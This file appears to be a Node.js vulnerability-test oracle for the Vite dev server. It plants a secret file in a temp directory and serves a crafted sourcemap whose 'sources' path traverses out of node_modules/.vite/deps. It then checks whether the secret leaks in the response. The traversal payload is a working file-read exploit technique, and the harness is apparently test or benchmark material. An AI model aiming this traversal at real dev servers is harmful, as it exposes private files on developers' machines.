const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-traversal-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'project');
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');

    const benignName = 'benign.js.map';
    const benignPayload = {
      version: 3,
      file: 'benign.js',
      sources: ['inside-source.ts'],
      names: [],
      mappings: 'AAAA'
    };
    fs.writeFileSync(path.join(depsDir, benignName), JSON.stringify(benignPayload));

    const secretPath = path.join(base, 'outside-secret.txt');
    const secretValue = 'SECRET_' + marker;
    fs.writeFileSync(secretPath, secretValue);

    const traversalToSecret = path.relative(depsDir, secretPath).split(path.sep).join('/');
    const maliciousName = 'malicious.js.map';
    const maliciousPayload = {
      version: 3,
      file: 'malicious.js',
      sources: [traversalToSecret],
      names: [],
      mappings: 'AAAA'
    };
    fs.writeFileSync(path.join(depsDir, maliciousName), JSON.stringify(maliciousPayload));

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer is unavailable');
    }

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true },
      optimizeDeps: { noDiscovery: true, force: false }
    });

    const request = (url) =>
      new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: {} };
        const res = {
          statusCode: 200,
          headers: {},
          body: '',
          setHeader(k, v) {
            this.headers[String(k).toLowerCase()] = v;
          },
          getHeader(k) {
            return this.headers[String(k).toLowerCase()];
          },
          writeHead(code, headers) {
            this.statusCode = code;
            if (headers && typeof headers === 'object') {
              for (const key of Object.keys(headers)) this.setHeader(key, headers[key]);
            }
            return this;
          },
          write(chunk) {
            if (chunk != null) this.body += String(chunk);
          },
          end(chunk) {
            if (chunk != null) this.body += String(chunk);
            resolve({ statusCode: this.statusCode || 200, headers: this.headers, body: this.body });
          }
        };

        try {
          server.middlewares.handle(req, res, () => {
            resolve({ statusCode: res.statusCode || 404, headers: res.headers, body: res.body || '' });
          });
        } catch (e) {
          reject(e);
        }
      });

    const benignResp = await request('/node_modules/.vite/deps/' + benignName);
    const benignBody = String((benignResp && benignResp.body) || '');
    const benignOk = benignResp && benignResp.statusCode >= 200 && benignResp.statusCode < 300 && benignBody.length > 0;
    if (!benignOk) {
      throw new Error('benign operation failed: status=' + (benignResp ? benignResp.statusCode : 'none') + ' body_len=' + benignBody.length);
    }

    operation_completed = true;

    let malResp;
    let malErr;
    try {
      malResp = await request('/node_modules/.vite/deps/' + maliciousName);
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious request threw (blocked): ' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malBody = String((malResp && malResp.body) || '');
      const leaked = malBody.includes(secretValue);
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benignResp.statusCode + ', mal_status=' + (malResp ? malResp.statusCode : 'none') + ', mal_len=' + malBody.length + ', leaked=' + leaked;
    }
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
  } finally {
    try {
      if (server) await server.close();
    } catch (_) {}
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();